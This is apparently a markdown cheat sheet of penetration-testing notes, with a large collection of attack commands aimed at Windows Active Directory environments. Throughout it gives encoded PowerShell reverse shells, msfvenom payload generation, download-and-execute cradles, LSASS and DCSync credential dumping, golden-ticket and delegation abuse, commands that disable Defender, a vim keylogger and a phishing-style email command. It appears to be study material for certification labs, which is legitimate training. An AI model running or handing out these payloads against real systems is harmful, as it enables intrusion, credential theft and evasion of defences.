cmd = "powershell -nop -w hidden -e " + base64.b64encode$

print(cmd)
```
- `python3 encode.py`
- `winrs -r:files04 -u:jen -p:Nexus123! "powershell -nop -w hidden -e JABjAGwA...MAZQAoACkA"` --- base64 encoded revshell
	- Run the encoded PowerShell payload and catch revshell on another target machine
	- PowerShell has WinRM built-in capabilities too:
```powershell
$username = 'jen';
$password = 'Nexus123!';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
New-PSSession -ComputerName 192.168.50.73 -Credential $credential
```
- `Enter-PSSession 1`
- WMI - <sub><code>wmic</code></sub>
	- Need credentials of a member of the *Administrators* local group, which can also be a domain user.
	- Can add new user
		- `wmic /node:192.168.50.73 /user:jen /password:Nexus123! process call create "net user hacker Password123! /add"`
		- `wmic /node:192.168.50.73 /user:jen /password:Nexus123! process call create "net localgroup administrators hacker /add"`
	- Reverse shell
		- `winrs -r:files04 -u:jen -p:Nexus123! "powershell -nop -w hidden -e JABjAGwAaQB...CkACgA="` --- base64 encoded revshell
	- Can also use PowerShell, first make WMI python script to encode PowerShell revshell:
```python
import sys
import base64

payload = '$client = New-Object System.Net.Sockets.TCPClient("192.168.118.2",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

cmd = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()

print(cmd)
```
- Run encoding script:
```bash
python3 encode.py
```
- Run PowerShell commands for revshell using encoded payload as `$Command`:

```powershell
$username = 'jen';
$password = 'Nexus123!';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
$options = New-CimSessionOption -Protocol DCOM
$session = New-Cimsession -ComputerName 192.168.50.73 -Credential $credential -SessionOption $Options 
$Command = 'powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5AD...
HUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA';
Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
```

- Catch revshell with `nc -lnvp 443`

---

- Using net.exe:
	- `net user /domain`
	- `net user jeffadmin /domain`
	- `net group /domain`
	- `net group "Sales Department" /domain`
		- `net group "Management Department" stephanie /add /domain`
- Using PowerView:
	- Transfer PowerView to Target
	- `powershell -ep bypass`
	- `Import-Module .\PowerView.ps1`
	- Run PowerView [commands](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993)*.*
		- `Get-NetDomain`
		- `Get-NetUser`
		- `Get-NetUser | select cn`
		- `Get-NetUser | select cn,pwdlastset,lastlogon`
		- `Get-NetGroup`
		- `Get-NetGroup | select cn`
		- `Get-NetGroup "Sales Department" | select member`
		- `Get-NetComputer`
		- `Get-NetComputer | select operatingsystem,operatingsystemversion,dnshostname,distinguishedname`
		- `Find-LocalAdminAccess`
			- Finds which computers the current user has Local Admin on
		- `Get-NetSession -ComputerName files04 -Verbose`
			- Finds which user is logged onto a computer (only works in older Windows)
		- `Get-NetUser -SPN | select samaccountname,serviceprincipalname`
			- Enumerate SPNs
		- `Get-ObjectAcl -Identity stephanie`
```plaintext
GenericAll: Full permissions on object
GenericWrite: Edit certain attributes on the object
WriteOwner: Change ownership of the object
WriteDACL: Edit ACE's applied to object
AllExtendedRights: Change password, reset password, etc.
ForceChangePassword: Password change for object
Self (Self-Membership): Add ourselves to for example a group
```
> Valuable AD permission types
- If I want to make it harder by not using BloodHound CE:
```Powershell
Get-ObjectAcl -Identity "Management Department" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights

Get-ObjectAcl -Identity stephanie | ? { $`*`.IdentityReference -like "Domain Users" -and @("GenericAll", "GenericWrite", "WriteOwner", "WriteDacl", "AllExtendedRights", "ForceChangePassword", "Self") -contains $`*`.ActiveDirectoryRights } | select IdentityReference, ActiveDirectoryRights

Get-ObjectAcl stephanie | ? { $_.ActiveDirectoryRights -match "GenericAll|GenericWrite|WriteOwner|WriteDacl|AllExtendedRights|ForceChangePassword|Self" } | select IdentityReference, ActiveDirectoryRights
```
- Enumerate Access Control Entries (ACE) in ACLs
	- `Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-1104`
```Powershell
"S-1-5-21-1987370270-658905905-1781884369-512","S-1-5-21-1987370270-658905905-1781884369-1104","S-1-5-32-548","S-1-5-18","S-1-5-21-1987370270-658905905-1781884369-519" | Convert-SidToName
```
- Convert SID to actual domain object name
		- `Find-DomainShare`
			- SYSVOL - mapped to **%SystemRoot%\SYSVOL\Sysvol\domain-name** on the domain controller and every domain user has access to it
			- `ls \dc1.corp.com\sysvol\corp.com\`
			- `cat \FILES04\docshare\docs\do-not-share\start-email.txt`
			- `ls "\FILES04.corp.com\Important Files"`
- PS Tools
	- Transfer PSLoggedOn.exe to Target
	- `powershell -ep bypass`
	- Run PSLoggedOn [commands](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993)*.*
		- `.\PsLoggedon.exe \files04`
			- Also finds which user is logged onto a computer (alt to `Get-NetSession` PowerView command)
- Using setspn.exe
	- `setspn -L iis_service`
		- Also enumerates SPNs (alt to `Get-NetUser -SPN` PowerView command)
- Using nslookup.exe
	- `nslookup.exe web04.corp.com`
		- Get IPs
- Using PowerShell and net.exe script (alternative for **PowerView**):
	- `powershell -ep bypass`
	- Get-NetDomain
	- Script - enumerates more groups than net.exe can:
```Powershell
function LDAPSearch {
	param (
        [string]$LDAPQuery
    )
    $PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
    $DistinguishedName = ([adsi]'').distinguishedName
    $DirectoryEntry = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$PDC/$DistinguishedName")
    $DirectorySearcher = New-Object System.DirectoryServices.DirectorySearcher($DirectoryEntry, $LDAPQuery)
    return $DirectorySearcher.FindAll()
}
```
- `Import-Module .\enumeration.ps1`
- `LDAPSearch -LDAPQuery "(samAccountType=805306368)"`
- `LDAPSearch -LDAPQuery "(objectclass=group)"`
- To print properties and attributes for objects:
```Powershell
foreach ($group in $(LDAPSearch -LDAPQuery "(objectCategory=group)")) {
$group.properties | select {$_.cn}, {$_.member}
}
```
- Specific group enumeration:
	- `$sales = LDAPSearch -LDAPQuery "(&(objectCategory=group)(cn=Sales Department))"`
	- `$sales.properties.member`

---


## Privilege Escalation Techniques

> Source: `01101100-C0D3X-00110110.md` → `AD > Privilege Escalation Techniques`

- **[Run as System using Evil WinRM](https://malicious.link/posts/2020/run-as-system-using-evil-winrm/)**  
  A detailed blog post explaining methods to escalate privileges to SYSTEM using Evil WinRM, a tool for Windows remote management exploitation.
- **[# Potatoes - Windows Privilege Escalation](https://jlajara.gitlab.io/Potatoes_Windows_Privesc)**  
  There are a lot of different potatoes used to escalate privileges from Windows Service Accounts to  NT AUTHORITY/SYSTEM.

- [Hot Potato](https://jlajara.gitlab.io/Potatoes_Windows_Privesc#hotPotato)
- [Rotten Potato](https://jlajara.gitlab.io/Potatoes_Windows_Privesc#rottenPotato)
- [Lonely Potato](https://jlajara.gitlab.io/Potatoes_Windows_Privesc#lonelyPotato)
- [Juicy Potato](https://jlajara.gitlab.io/Potatoes_Windows_Privesc#juicyPotato)
- [Rogue Potato](https://jlajara.gitlab.io/Potatoes_Windows_Privesc#roguePotato)
- [Sweet Potato](https://jlajara.gitlab.io/Potatoes_Windows_Privesc#sweetPotato)
- [Generic Potato](https://jlajara.gitlab.io/Potatoes_Windows_Privesc#genericPotato)
- [God Potato](https://github.com/BeichenDream/GodPotato)


## RunasCs

> Source: `01101100-C0D3X-00110110.md` → `AD > Privilege Escalation Techniques > RunasCs`

https://github.com/antonioCoco/RunasCs
  - When `runas /user:` and `runas /savecred` won't work but we KNOW we have valid creds.
```c
Examples:
    Run a command as a local user
        RunasCs.exe user1 password1 "cmd /c whoami /all"
    Run a command as a domain user and logon type as NetworkCleartext (8)
        RunasCs.exe user1 password1 "cmd /c whoami /all" -d domain -l 8
    Run a background process as a local user,
        RunasCs.exe user1 password1 "C:\tmp\nc.exe 10.10.10.10 4444 -e cmd.exe" -t 0
    Redirect stdin, stdout and stderr of the specified command to a remote host
        RunasCs.exe user1 password1 cmd.exe -r 10.10.10.10:4444
    Run a command simulating the /netonly flag of runas.exe
        RunasCs.exe user1 password1 "cmd /c whoami /all" -l 9
    Run a command as an Administrator bypassing UAC
        RunasCs.exe adm1 password1 "cmd /c whoami /priv" --bypass-uac
    Run a command as an Administrator through remote impersonation
        RunasCs.exe adm1 password1 "cmd /c echo admin > C:\Windows\admin" -l 8 --remote-impersonation
```
---


## Payloads

> Source: `01101100-C0D3X-00110110.md` → `AD > Payloads`

---

Multi handler oneliner with custom certificate

```shell
msfconsole -q -x 'use multi/handler; set payload windows/x64/meterpreter/reverse_https; set HandlerSSLCert /home/kali/worstenbrood.pem; set lhost 192.168.49.92; set lport 443; run'
```

EXE

```shell
sudo msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.1 LPORT=444 -f exe -o /var/www/html/shell.exe
```

VBA

```shell
msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.1 LPORT=443 EXITFUNC=thread -f vbapplication
```

CSharp SharpShooter payload (edit file after creation, remove first line and brackets)

```shell
msfvenom -a x64 -p windows/x64/meterpreter/reverse_https LHOST=192.168.1.1 LPORT=443 EnableStageEncoding=True PrependMigrate=True -f csharp -o /var/www/html/payload.txt
```

DLL (for rundll32)

```shell
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.1.1 LPORT=443 -f dll -o data/exploit.dll
```

Python

```shell
msfvenom -p python/meterpreter/reverse_https LHOST=192.168.1.1 LPORT=443 -f raw -o data/shell.py
```

ELF

```shell
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=443 EXITFUNC=thread -f elf -o /var/www/html/met.elf
```

DotNetToJscriptDirectly

```shell
DotNetToJScript.exe ExampleAssembly.dll --lang=VBScript --ver=v4 -o runner.vbs
```

JS through SharpShooter

```shell
python SharpShooter.py --payload js --dotnetver 4 --stageless --rawscfile /var/www/html/shell.txt --output test

python SharpShooter.py --payload js --dotnetver 2 --scfile /var/www/html/payload.txt --output test --delivery web --web http://192.168.1.1/output/test.payload --smuggle --template mcafee --shellcode
```

HTA through SharpShooter

```shell
python2 SharpShooter.py --payload hta --rawscfile ~/sharpshooter.raw --dotnetver 2  --output test --stageless
```

Domain fronting meterpreter

```shell
msfvenom -p windows/x64/meterpreter/reverse_http LHOST=do.skype.com LPORT=80 HttpHostHeader=cdn.azureedge.net -f exe > http-df.exe
```

```shell
set LHOST do.skype.com
set OverrideLHOST do.skype.com
set OverrideRequestHost true
set HttpHostHeader offensive-security.azureedge.net
run -j
```

---


## Execute

> Source: `01101100-C0D3X-00110110.md` → `AD > Execute`

---

Powershell one-liner (base64 payload)

```powershell
$text = "(New-Object System.Net.WebClient).DownloadString('http://192.168.1.1/run.txt') | IEX"
$bytes = [System.Text.Encoding]::Unicode.GetBytes($text)
$EncodedText = [Convert]::ToBase64String($bytes)
$EncodedText

powershell -enc KAB...
```

WMIC

```shell
wmic process get brief /format:"http://192.168.1.1/payload.xsl"
```

Microsoft.Workflow.Compiler

```plaintext
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe run.xml results.xml
```

Run.xml

```csharp
using System;
using System.Workflow.ComponentModel;
public class Run : Activity{
    public Run() {
        Console.WriteLine("I executed!");
    }
}
```

installutil

```plaintext
bitsadmin /Transfer myJob http://192.168.1.1/payload.txt C:\users\student\enc.txt && certutil -decode C:\users\student\enc.txt C:\users\student\Bypass.exe && del C:\users\student\enc.txt && C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U C:\users\student\Bypass.exe
```

rundll32

```plaintext
rundll32 test.dll,run
rundll32 shell32.dll,Control_RunDLL C:\Users\student\exploit.dll (msf payload)
```

Alternate Data stream

```plaintext
type Desktop\jscript.js > "C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:test2.js
```

```plaintext
wscript "C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:test2.js"
```

HTA shortcut

```plaintext
C:\Windows\System32\mshta.exe http://192.168.1.1/payload.hta
```

PowerShell with error printing

```powershell
powershell -Command wget -Uri http://192.168.1.1:81/ -Method POST -Body $(powershell Invoke-WebRequest 'http://192.168.1.1/met.exe' -OutFile '%TEMP%\\met.exe')
```

Macro Shell with error printing

```plaintext
Dim str As String
str = "powershell -Command wget -Uri http://192.168.1.1:81/ -Method POST -Body $(powershell Invoke-WebRequest 'http://192.168.1.1/met.exe' -OutFile '%TEMP%\\met.exe')"
Shell str, vbHide
```

JScript shell with error printing

```html
<html>
<head>
<script language="JScript">
var shell = new ActiveXObject("WScript.Shell");
var res = shell.Run("powershell -Command wget -Uri http://192.168.1.1:81/ -Method POST -Body $(powershell whoami)");
</script>
</head>
<body>
<script language="JScript">
self.close();
</script>
</body>
</html>
```

Loading a driver through sc.exe

```plaintext
sc create mimidrv binPath= C:\inetpub\wwwroot\upload\mimidrv.sys type= kernel start= demand
sc start mimidrv
```

VBS get

```plaintext
Dim o
Set o = CreateObject("MSXML2.XMLHTTP")
o.open "GET", "http://192.168.1.1/fromvbs", False
o.send
```

JS get

```plaintext
var url = "http://192.168.1.1/fromjs"
var Object = WScript.CreateObject('MSXML2.XMLHTTP');

Object.Open('GET', url, false);
Object.Send();
```

BAT get

```plaintext
start "" http://192.168.1.1/frombat
```

Linux rev shell bash

```shell
curl 192.168.1.1/s.sh | bash
```

---


## AD / MSSQL

> Source: `01101100-C0D3X-00110110.md` → `AD > MSSQL`

```bash
mssqlclient.py oscp.exam\\celia.almeda:e728ecbadfb02f51ce8eed753f3ff3fd@10.10.168.142

dbeaver
```

---

Query MSSQL servers

```plaintext
setspn -T <domain> -Q MSSQLSvc/*

. .\GetUserSPNs.ps1

dbeaver
```

xp\_cmdshell

```sql
EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell 'whoami'
```

xp\_dirtree

```plaintext
.\SQL.exe sql.domain.com msdb "EXEC master.sys.xp_dirtree '\\192.168.1.1\file', 1, 1;"
```

sp\_OACreate and sp\_OAMethod

```sql
EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;
DECLARE @myshell INT; EXEC sp_oacreate 'wscript.shell', @myshell OUTPUT; EXEC sp_oamethod @myshell, 'run', null, 'cmd /c \"echo Test > C:\\Tools\\file.txt\"';
```

Exec on linked server

```sql
select * from openquery("SERVER", 'select USER_NAME()')
```

Custom assembly from file

```sql
use msdb

EXEC sp_configure 'show advanced options',1
RECONFIGURE

EXEC sp_configure 'clr enabled',1
RECONFIGURE

EXEC sp_configure 'clr strict security', 0
RECONFIGURE

CREATE ASSEMBLY myAssembly FROM 'c:\tools\cmdExec.dll' WITH PERMISSION_SET = UNSAFE;

CREATE PROCEDURE [dbo].[cmdExec] @execCommand NVARCHAR (4000) AS EXTERNAL NAME [myAssembly].[StoredProcedures].[cmdExec];

EXEC cmdExec 'whoami'
```

Custom assembly from hex

```sql
CREATE ASSEMBLY my_assembly FROM 0x4D7A..... WITH PERMISSION_SET = UNSAFE;
```

Load PowerUpSQL

```powershell
(new-object system.net.webclient).downloadstring('http://192.168.1.1/PowerUpSQL.ps1') | IEX
```

Get all accessible domain MSSQL’s

```plaintext
Get-SQLInstanceDomain -Verbose | Get-SQLConnectionTestThreaded -Verbose -Threads 10
```

Enum database users

Audit SQL

---


## Tunneling

> Source: `01101100-C0D3X-00110110.md` → `AD > Tunneling`

---

[See Pivoting Notes](obsidian://open?vault=Wizard-Book&file=OffSec%2FOSCP%2B%2FPivoting)

DNSCAT

```plaintext
dnscat2-server tunnel.com
dnscat2-v0.07-client-win32.exe tunnel.com
listen 127.0.0.1:3389 172.16.51.21:3389
```

MSF autoroute

```shell
use multi/manage/autoroute
set session 1
exploit
use auxiliary/server/socks_proxy
set version 4a
set srvhost 127.0.0.1
exploit -j

bash -c 'echo "socks4 127.0.0.1 1080" >> /etc/proxychains.conf'

proxychains rdesktop 192.168.1.1
```

Chisel

```plaintext
./chisel server -p 8080 --socks5 << server
ssh -N -D 0.0.0.0:1080 localhost << server (tunnel)
chisel.exe client 192.168.1.1:8080 socks << client
```

---


## PrivEsc

> Source: `01101100-C0D3X-00110110.md` → `AD > PrivEsc`

---

Load PowerUp

```powershell
(new-object system.net.webclient).downloadstring('http://192.168.49.249:8000/PowerUp.ps1') | IEX
Invoke-AllChecks
```

Load PrivEscCheck https://github.com/itm4n/PrivescCheck

```powershell
(new-object system.net.webclient).downloadstring('http://192.168.49.236/PrivescCheck.ps1') | IEX
Invoke-PrivescCheck -Extended
```

Shadowcopies

```plaintext
wmic shadowcopy call create Volume='C:\'
vssadmin list shadows
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\sam C:\users\domain.com\Downloads\sam
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\system C:\users\domain.com\Downloads\system
```

LAPS

```powershell
(new-object system.net.webclient).downloadstring('http://192.168.1.1/LAPSToolkit.ps1') | IEX

Get-LAPSComputers (get all computers with labs, including pw)
Find-LAPSDelegatedGroups (users that are allowed to view pws)
Get-NetGroupMember -GroupName "LAPS Password Readers"
```

MSF

```shell
use post/windows/gather/credentials/enum_laps
```

View current privs

Spoolsample local exploit

```plaintext
upload C:\\Windows\\Tasks\\met.exe
impersonate.exe \\.\pipe\test\pipe\spoolss
SpoolSample.exe srv srv/pipe/test
```

Mimikatz remove PPL and dump pws

```plaintext
privilege::debug (enable priv)
!+ (load driver)
!processprotect /process:lsass.exe /remove (remove ppl protection)
sekurlsa::logonpasswords (dump pws)
```

Offline dump lsass

```plaintext
procdump.exe lsass.exe

sekurlsa::minidump lsass.dmp
sekurlsa::logonpasswords
```

Remotely load Invoke-Mimikatz

```powershell
(new-object system.net.webclient).downloadstring('http://192.168.1.1/mimikatz.txt') | IEX
```

Invoke-Mimikatz remove PPL Protection

```powershell
Invoke-Mimikatz -Command "\`"!processprotect /process:lsass.exe /remove\`""
```

Invoke-Mimikatz get passwords from minidump

```powershell
Invoke-Mimikatz -Command "\`"sekurlsa::minidump c:\tools\lsass.dmp\`" sekurlsa::logonpasswords"
```

Invoke-Mimikatz remove ppl & dump passwords

```powershell
Invoke-Mimikatz -Command "privilege::debug" !+ "!processprotect /process:lsass.exe /remove" sekurlsa::logonpasswords
```

Enable wdigest

```plaintext
HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest  -> value "1"
```

VIM

```shell
.vimrc
~/.vim/plugin/<name>.vim
:silent !source ~/.vimrunscript
```

.bashrc

View sudo current user permissions

Open shell

Keylogger

```shell
:if $USER == "root"
:autocmd BufWritePost * :silent :w! >> /tmp/hackedfromvim.txt
:endif
```

---

## Enum

> Source: `01101100-C0D3X-00110110.md` → `AD > Enum`

View object ACL’s

```powershell
(new-object system.net.webclient).downloadstring('http://192.168.1.1/powerview.ps1') | IEX

Get-ObjectAcl -Identity <username>
Get-ObjectAcl -Identity <username> -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_}
```

View all user objects access rights (GenericAll, WriteDACL)

```powershell
Get-DomainUser | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}}
```

View all group objects access rights (GenericAll, WriteDACL)

```powershell
Get-DomainGroup | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}}
```

Change ACL if WriteDACL is set on object

```powershell
Add-DomainObjectAcl -TargetIdentity <target username/group> -PrincipalIdentity <username> -Rights All
```

Get interesting ACL’s

```powershell
Invoke-ACLScanner -ResolveGUIDs
```


## Unconstrained delegation

> Source: `01101100-C0D3X-00110110.md` → `AD > Unconstrained delegation`

Get unconstrained delegation computers

```powershell
Get-DomainComputer -Unconstrained

-Domain domain.com (optional to enum other domains in forest)
```

View and use forwardable tickets on unconstrained host

```plaintext
privilege::debug
sekurlsa::tickets
sekurlsa::tickets /export
kerberos::ptt <filename>
C:\Tools\SysinternalsSuite\PsExec.exe \\dc01 cmd
whoami
```

Check printer spooler service active on remote host

```plaintext
dir \\dc01\pipe\spoolss
ls \\dc01\pipe\spoolss
```

Rubeus monitor for incoming tickets filtered by host (run on Unconstrained delegation host)

```plaintext
Rubeus.exe monitor /interval:5 /filteruser:DC01$
```

Force remote host to connect to host

```plaintext
SpoolSample.exe DC01 TARGET01
```

Use ticket with Rubeus

```plaintext
Rubeus.exe ptt /ticket:<base64>
```

Force dcsync using mimikatz to get user hashes using injected ticket

```plaintext
lsadump::dcsync /domain:x.domain.com /user:x\krbtgt
lsadump::dcsync /domain:x.domain.com /user:x\administrator
```


## Constrained delegation

> Source: `01101100-C0D3X-00110110.md` → `AD > Constrained delegation`

Get constrained delegation computers

```powershell
Get-DomainComputer -TrustedToAuth

-Domain d.com (optional to enum other domains in forest)
```

Generate a TGT for a user

```plaintext
.\Rubeus.exe asktgt /user:iissvc /domain:x.com /rc4:<hash>
```

S4U Constrained Delegation generate ticket for any domain user

```plaintext
.\Rubeus.exe s4u /ticket:doIE+jCCBP... /impersonateuser:administrator /msdsspn:mssqlsvc/dc01.domain.com:1433 /ptt
```

S4U Constrained Delegation generate ticket for any domain user for a alternative service on the same host

```plaintext
.\Rubeus.exe s4u /ticket:doIE+jCCBPag... /impersonateuser:administrator /msdsspn:mssqlsvc/dc01.domain.com:1433 /altservice:CIFS /ptt
```

PowerShell Remotely load rubeus

```plaintext
$data = (New-Object System.Net.WebClient).DownloadData('http://192.168.1.1/Rubeus.exe')
$assem = [System.Reflection.Assembly]::Load($data)
[Rubeus.Program]::Main("purge".Split())
[Rubeus.Program]::Main("s4u /user:host$ /rc4:x /impersonateuser:administrator /msdsspn:cifs/host$ /ptt".Split())
ls \\host\c$
```


## Resource-Based Constrained Delegation

> Source: `01101100-C0D3X-00110110.md` → `AD > Resource-Based Constrained Delegation`

Get GenericWrite computers

```powershell
Get-DomainComputer | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}}
```

Get machine quota in the domain

```powershell
Get-DomainObject -Identity prod -Properties ms-DS-MachineAccountQuota
```

Add computer using PowerMad

```powershell
(new-object system.net.webclient).downloadstring('http://192.168.1.1/Powermad.ps1') | IEX

New-MachineAccount -MachineAccount myComputer -Password $(ConvertTo-SecureString 'h4x' -AsPlainText -Force)
```

Update msDS-AllowedToActOnBehalfOfOtherIdentity of ‘server’ object to newly created machine

```powershell
$sid =Get-DomainComputer -Identity myComputer -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($sid))"
$SDbytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDbytes,0)
Get-DomainComputer -Identity server | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
```

Use computer account to generate ticket

```plaintext
.\Rubeus.exe s4u /user:myComputer$ /rc4:x /impersonateuser:administrator /msdsspn:CIFS/dc01.domain.com /ptt
```

Add computer using impacket

```plaintext
python3 /usr/share/doc/python3-impacket/examples/addcomputer.py -k -no-pass -computer-name 'rbcd$' -computer-pass 'Password12345' -dc-ip 1.1.1.1 DOMAIN/user -dc-host dc.domain.com
```

Update msDS-AllowedToActOnBehalfOfOtherIdentity of ‘server’ object to newly created machine using impacket

```plaintext
python3 rbcd.py -delegate-to 'HOST$' -delegate-from 'rbcd$' -action write -k -no-pass DOMAIN/user -debug
```

Get service ticket using impacket

```plaintext
python3 /usr/share/doc/python3-impacket/examples/getST.py -spn CIFS/HOST.DOMAIN.COM -impersonate 'Administrator' -dc-ip 1.1.1.1 'DOMAIN/rbcd$:Password12345'
```


## Kerberoasting

> Source: `01101100-C0D3X-00110110.md` → `AD > Kerberoasting`

PowerShell load assembly Rubeus from base64

```powershell
[Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\Temp\Rubeus.exe")) | Out-File -Encoding ASCII C:\Temp\rubeus.txt

$a = Get-Content .\rubeus.txt
$assem = [System.Reflection.Assembly]::Load([Convert]::FromBase64String($a))
```

Export all available tickets

```plaintext
[Rubeus.Program]::Main("kerberoast /outfile:C:\temp\hashes.txt".Split())
```


## Forest enum

> Source: `01101100-C0D3X-00110110.md` → `AD > Forest enum`

Get trusted domains

```powershell
nltest /trusted_domains

([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()

Get-DomainTrust -API [-Domain anotherdomaininforest.com] (WIN32)

Get-DomainTrust [-Domain anotherdomaininforest.com] (LDAP)
```

Enumerate users in a trusted domain / forest with PowerView

```powershell
Get-DomainUser -Domain domain.com
```

Enumerate groups in a trusted domain / forest with PowerView

```powershell
Get-DomainGroup -Domain domain.com
```

Get users in Enterprise Admins group of root domain

```powershell
Get-DomainGroupMember -Identity "Enterprise Admins" -Domain domain.com
```


## Forest compromise

> Source: `01101100-C0D3X-00110110.md` → `AD > Forest compromise`

Dump KRBTGT

```plaintext
lsadump::dcsync /domain:d.x.com /user:d\krbtgt
```

Generate domain SID

```powershell
Get-DomainSID -Domain d.x.com
```

Generate golden ticket with ExtraSides (obtaining Enterprise Admins role in trusted domain) <destination domain SID with "-519" appended>

```plaintext
kerberos::golden /user:h4x /domain:domain.com /sid:S-1-5x /krbtgt:x /sids:S-1-5-21-x-519 /ptt
```


## Beyond forest enum

> Source: `01101100-C0D3X-00110110.md` → `AD > Beyond forest enum`

Get forest trusts

```powershell
([System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()).GetAllTrustRelationships()

Get-ForestTrust
```

Get trusts to domains in other forest

```powershell
Get-DomainTrust -Domain d.com

Get-DomainTrustMapping
```

Get users in other forest

```powershell
Get-DomainUser -Domain d.com
```

Get group members of a group in another forest

```powershell
Get-DomainForeignGroupMember -Domain d.com
```

Enable SID history (on target forest DC)

```plaintext
netdom trust d2.com /d:d1.com /enablesidhistory:yes
```

---


## AD / Enumeration

> Source: `01101100-C0D3X-00110110.md` → `AD > Enumeration`

---

Enumerate Windows with HostRecon

```powershell
(new-object system.net.webclient).downloadstring('http://192.168.1.1/HostRecon.ps1') | IEX

Invoke-HostRecon
```

Check if PPL Protection is enabled

```powershell
Get-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\Lsa -Name "RunAsPPL"
```

Check if AppLocker is enabled

```powershell
Get-ChildItem -Path HKLM:\SOFTWARE\Policies\Microsoft\Windows\SrpV2\Exe
```

Check PowerShell execution context

```powershell
$ExecutionContext.SessionState.LanguageMode
```

Get loaded DLL’s

```powershell
[appdomain]::currentdomain.getassemblies() | Sort-Object -Property fullname | Format-Table fullname
```

---


## Windows Defender

> Source: `01101100-C0D3X-00110110.md` → `AD > Windows Defender`

---

Disable defender realtime montoring

```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
```

Defender get detection history

Defender remove signatures

```powershell
MpCmdRun.exe -RemoveDefinitions -All
```

Defender settings

---


## AD / Other

> Source: `01101100-C0D3X-00110110.md` → `AD > Other`

---

View current Integrity

Rubeus Password to hash

```plaintext
.\Rubeus.exe hash /password:lab
```

Run CMD as other usr

```plaintext
runas /user:administrator@d.com cmd
```

Nmap through Proxychains

```plaintext
proxychains nmap -sT -Pn 192.168.1.1
```

Get NTLM from krb5.keytab file

```plaintext
./keytabextract.py krb5.keytab
```

Search fileshares

```powershell
Invoke-ShareFinder -Verbose -Domain d
Find-DomainShare -CheckShareAccess
```

Find machines current user has local admin

View local admins on computer

```powershell
Find-GPOComputerAdmin –Computername <ComputerName>
```

List GPO’s

Reset user PW through PowerView

```powershell
Set-DomainUserPassword -Identity User -Verbose
```

Send mail with swaks

```shell
swaks --to w@domain.com --server 192.168.1.1 --body "Hello" --header "Subject: Issues"  --from hacker@domain.com


sudo swaks -t jim@relia.com --from maildmz@relia.com --attach config.Library-ms --server 192.168.243.189 --body "Attached is the link to the problematic email." --header "Subject: Urgent Mail Issue" --auth-user 'maildmz@relia.com' --auth-password 'DPuBT9tGCBrTbR' --suppress-data
```

PowerSharpPack

```powershell
